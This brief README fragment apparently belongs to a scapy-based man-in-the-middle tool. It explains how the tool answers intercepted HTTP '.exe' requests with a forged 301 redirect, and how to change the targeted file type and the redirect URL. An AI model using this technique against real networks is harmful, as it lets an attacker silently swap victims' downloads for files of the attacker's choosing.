* <b>It doens't working in modern websites, because they using 443 port and reject other connections, 80 port not except</b>
* So if you want to intercept other files, not only ".exe" , you can change ".exe" -> ".jpg"
* Rederection works in this line:</br>
<code>modified_packet = set_load(scapy_packet,"HTTP/1.1 301 Moved Permanently\nLocation: https://browser.yandex.ru/download?banerid=6302000000&os=win\n\n") </code>
* If you want to use other redirection, just change the link after "Location: "